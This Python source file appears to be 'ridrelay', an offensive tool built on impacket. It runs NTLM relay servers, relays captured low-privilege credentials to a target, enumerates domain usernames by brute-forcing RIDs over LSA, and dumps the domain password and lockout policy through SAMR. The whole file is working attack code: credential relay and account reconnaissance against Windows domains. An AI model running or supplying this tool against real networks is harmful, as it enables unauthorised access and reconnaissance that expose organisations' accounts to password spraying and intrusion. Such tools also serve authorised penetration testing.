import argparse
import sys
import logging
from threading import Thread
from time import sleep, strftime, gmtime

from impacket import smb, smb3
from impacket.dcerpc.v5 import transport, lsat, lsad, samr
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
from impacket.examples.ntlmrelayx.servers.httprelayserver import HTTPRelayServer
from impacket.examples import logger
from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.smbconnection import SMBConnection

got_usernames = False


class SMBAttack(Thread):
    def __init__(self, config, SMBClient, username):
        Thread.__init__(self)
        self.daemon = True
        if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
            self.__SMBConnection = SMBConnection(existingConnection=SMBClient)
        else:
            self.__SMBConnection = SMBClient
        self.config = config

    def run(self):
        global got_usernames
        rpctransport = transport.SMBTransport(self.__SMBConnection.getRemoteHost(), filename=r'\lsarpc',
                                              smb_connection=self.__SMBConnection)
        dce = rpctransport.get_dce_rpc()
        maxRid = 50000
        dce.connect()

        dce.bind(lsat.MSRPC_UUID_LSAT)
        resp = lsat.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']

        # Get Domain Sid if we are in a domain
        logging.info('Dumping usernames')
        resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle,
                                                 lsad.POLICY_INFORMATION_CLASS.PolicyPrimaryDomainInformation)
        in_domain = True
        if resp['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid']:
            domainSid = resp['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid'].formatCanonical()
        else:
            # If we get an exception, maybe we aren't in a domain. Get local Sid instead
            logging.info('Target not joined to a domain. Getting local accounts instead')
            in_domain = False
            resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle,
                                                     lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
            domainSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()

        fh = None
        if self.config.outputFile:
            try:
                fh = open(self.config.outputFile, 'w+')
            except Exception:
                logging.exception('Could not open file for writing')

        soFar = 0
        SIMULTANEOUS = 1000
        for j in range(maxRid / SIMULTANEOUS + 1):
            if (maxRid - soFar) / SIMULTANEOUS == 0:
                sidsToCheck = (maxRid - soFar) % SIMULTANEOUS
            else:
                sidsToCheck = SIMULTANEOUS

            if sidsToCheck == 0:
                break

            sids = list()
            for i in xrange(soFar, soFar + sidsToCheck):
                sids.append(domainSid + '-%d' % i)
            try:
                lsat.hLsarLookupSids(dce, policyHandle, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
            except DCERPCException as e:
                if str(e).find('STATUS_NONE_MAPPED') >= 0:
                    soFar += SIMULTANEOUS
                    continue
                elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
                    resp = e.get_packet()
                else:
                    raise

            for n, item in enumerate(resp['TranslatedNames']['Names']):
                if item['Use'] != SID_NAME_USE.SidTypeUnknown:
                    line = "%d: %s\\%s (%s)" % (
                    soFar + n, resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name'],
                    SID_NAME_USE.enumItems(item['Use']).name)
                    print line
                    if fh:
                        fh.write(line + '\n')

            soFar += SIMULTANEOUS

        if fh:
            fh.close()
        dce.disconnect()

        if in_domain:
            # Only works if we are relaying to a domain member
            SAMRDump().dump(self.__SMBConnection)

        got_usernames = True


class SAMRDump:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\samr]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\samr]', 445),
    }

    def dump(self, SMBClient):
        """Dumps the list of users and shares registered present at
        addr. Addr is a valid host name or IP address.
        """

        print('\n')

        rpctransport = transport.SMBTransport(SMBClient.getRemoteHost(), filename=r'\lsarpc',
                                              smb_connection=SMBClient)
        try:
            self.__fetchList(rpctransport)
        except Exception as e:
            print('\n\t[!] Protocol failed: {0}'.format(e))
        else:
            # Got a response. No need for further iterations.
            self.__pretty_print()

    def __fetchList(self, rpctransport):
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        # Setup Connection
        resp = samr.hSamrConnect2(dce)
        if resp['ErrorCode'] != 0:
            raise Exception('Connect error')

        resp2 = samr.hSamrEnumerateDomainsInSamServer(
                        dce,
                        serverHandle=resp['ServerHandle'],
                        enumerationContext=0,
                        preferedMaximumLength=500)
        if resp2['ErrorCode'] != 0:
            raise Exception('Connect error')

        resp3 = samr.hSamrLookupDomainInSamServer(
                        dce,
                        serverHandle=resp['ServerHandle'],
                        name=resp2['Buffer']['Buffer'][0]['Name'])
        if resp3['ErrorCode'] != 0:
            raise Exception('Connect error')

        resp4 = samr.hSamrOpenDomain(dce, serverHandle=resp['ServerHandle'],
                                     desiredAccess=samr.MAXIMUM_ALLOWED,
                                     domainId=resp3['DomainId'])
        if resp4['ErrorCode'] != 0:
            raise Exception('Connect error')

        self.__domains = resp2['Buffer']['Buffer']
        domainHandle = resp4['DomainHandle']
        # End Setup

        domain_passwd = samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation
        re = samr.hSamrQueryInformationDomain2(
                    dce, domainHandle=domainHandle,
                    domainInformationClass=domain_passwd)
        self.__min_pass_len = re['Buffer']['Password']['MinPasswordLength'] \
            or "None"
        pass_hist_len = re['Buffer']['Password']['PasswordHistoryLength']
        self.__pass_hist_len = pass_hist_len or "None"
        self.__max_pass_age = self.__convert(
                int(re['Buffer']['Password']['MaxPasswordAge']['LowPart']),
                int(re['Buffer']['Password']['MaxPasswordAge']['HighPart']))
        self.__min_pass_age = self.__convert(
                int(re['Buffer']['Password']['MinPasswordAge']['LowPart']),
                int(re['Buffer']['Password']['MinPasswordAge']['HighPart']))
        self.__pass_prop = self.__d2b(re['Buffer']['Password']['PasswordProperties'])

        domain_lockout = samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation
        re = samr.hSamrQueryInformationDomain2(
                        dce, domainHandle=domainHandle,
                        domainInformationClass=domain_lockout)
        self.__rst_accnt_lock_counter = self.__convert(
                0,
                re['Buffer']['Lockout']['LockoutObservationWindow'],
                lockout=True)
        self.__lock_accnt_dur = self.__convert(
                0,
                re['Buffer']['Lockout']['LockoutDuration'],
                lockout=True)
        self.__accnt_lock_thres = re['Buffer']['Lockout']['LockoutThreshold'] \
            or "None"

        domain_logoff = samr.DOMAIN_INFORMATION_CLASS.DomainLogoffInformation
        re = samr.hSamrQueryInformationDomain2(
                        dce, domainHandle=domainHandle,
                        domainInformationClass=domain_logoff)
        self.__force_logoff_time = self.__convert(
                re['Buffer']['Logoff']['ForceLogoff']['LowPart'],
                re['Buffer']['Logoff']['ForceLogoff']['HighPart'])

        dce.disconnect()

    def __pretty_print(self):

        PASSCOMPLEX = {
            5: 'Domain Password Complex:',
            4: 'Domain Password No Anon Change:',
            3: 'Domain Password No Clear Change:',
            2: 'Domain Password Lockout Admins:',
            1: 'Domain Password Store Cleartext:',
            0: 'Domain Refuse Password Change:'
        }

        print('\n[+] Found domain(s):\n')
        for domain in self.__domains:
            print('\t[+] {0}'.format(domain['Name']))

        print("\n[+] Password Info for Domain: {0}".format(
                self.__domains[0]['Name']))

        print("\n\t[+] Minimum password length: {0}".format(
                self.__min_pass_len))
        print("\t[+] Password history length: {0}".format(
                self.__pass_hist_len))
        print("\t[+] Maximum password age: {0}".format(self.__max_pass_age))
        print("\t[+] Password Complexity Flags: {0}\n".format(
                self.__pass_prop or "None"))

        for i, a in enumerate(self.__pass_prop):
            print("\t\t[+] {0} {1}".format(PASSCOMPLEX[i], str(a)))

        print("\n\t[+] Minimum password age: {0}".format(self.__min_pass_age))
        print("\t[+] Reset Account Lockout Counter: {0}".format(
                self.__rst_accnt_lock_counter))
        print("\t[+] Locked Account Duration: {0}".format(
                self.__lock_accnt_dur))
        print("\t[+] Account Lockout Threshold: {0}".format(
                self.__accnt_lock_thres))
        print("\t[+] Forced Log off Time: {0}".format(
                self.__force_logoff_time))

    def __convert(self, low, high, lockout=False):
        time = ""
        tmp = 0

        if low == 0 and hex(high) == "-0x80000000":
            return "Not Set"
        if low == 0 and high == 0:
            return "None"

        if not lockout:
            if (low != 0):
                high = abs(high + 1)
            else:
                high = abs(high)
                low = abs(low)

            tmp = low + (high) * 16 ** 8  # convert to 64bit int
            tmp *= (1e-7)  # convert to seconds
        else:
            tmp = abs(high) * (1e-7)

        try:
            minutes = int(strftime("%M", gmtime(tmp)))
            hours = int(strftime("%H", gmtime(tmp)))
            days = int(strftime("%j", gmtime(tmp))) - 1
        except ValueError as e:
            return "[-] Invalid TIME"

        if days > 1:
            time += "{0} days ".format(days)
        elif days == 1:
            time += "{0} day ".format(days)
        if hours > 1:
            time += "{0} hours ".format(hours)
        elif hours == 1:
            time += "{0} hour ".format(hours)
        if minutes > 1:
            time += "{0} minutes ".format(minutes)
        elif minutes == 1:
            time += "{0} minute ".format(minutes)
        return time

    def __d2b(self, a):
        tbin = []
        while a:
            tbin.append(a % 2)
            a /= 2

        t2bin = tbin[::-1]
        if len(t2bin) != 8:
            for x in xrange(6 - len(t2bin)):
                t2bin.insert(0, 0)
        return ''.join([str(g) for g in t2bin])


if __name__ == '__main__':
    RELAY_SERVERS = (SMBRelayServer,HTTPRelayServer)  # TODO: Maybe fix HTTP redirects later
    ATTACKS = {'SMB': SMBAttack, 'HTTP': SMBAttack}

    parser = argparse.ArgumentParser(description='A sure fire way to enumerate domain usernames')
    parser.add_argument('--target', '-t', metavar='TARGET', required=True, help='An IP address value that states which '
                                                                                'target to relay TO')
    parser.add_argument('--out-file', '-o', metavar='OUTFILE', help='The file to output usernames to.')
    args = parser.parse_args()

    logger.init()
    print 'ridrelay v0.2 - Get domain usernames by relaying low priv creds!\n'

    logging.getLogger().setLevel(logging.INFO)
    logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    codec = sys.getdefaultencoding()

    targetSystem = TargetsProcessor(singleTarget=args.target, protocolClients=PROTOCOL_CLIENTS)

    threads = set()

    for server in RELAY_SERVERS:
        # Set up config
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setRunSocks(False, None)
        c.setTargets(targetSystem)
        c.setEncoding(codec)
        c.setAttacks(ATTACKS)
        c.setOutputFile(args.out_file)
        c.setSMB2Support(True)
        c.setInterfaceIp('')
        c.setMode('REDIRECT')
        c.setRedirectHost(True)

        s = server(c)
        s.start()
        threads.add(s)

    print ""
    logging.info("Servers started, waiting for connections")
    try:
        while not got_usernames:
            sleep(1)
    except KeyboardInterrupt:
        logging.info("Exiting... Remember to stop Responder if you need to")
    except Exception:
        pass

    for s in threads:
        del s

    sys.exit(0)
